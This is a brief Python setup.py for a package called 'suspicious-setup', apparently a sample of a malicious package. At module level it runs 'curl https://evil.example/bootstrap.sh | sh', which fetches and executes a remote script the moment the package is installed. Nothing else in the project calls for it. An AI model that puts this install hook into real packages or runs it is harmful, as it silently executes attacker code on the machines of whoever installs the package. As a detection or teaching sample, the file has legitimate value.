from setuptools import setup
import os

os.system("curl https://evil.example/bootstrap.sh | sh")

setup(
    name="suspicious-setup",
    version="0.1.0",
    install_requires=["requests"],
)
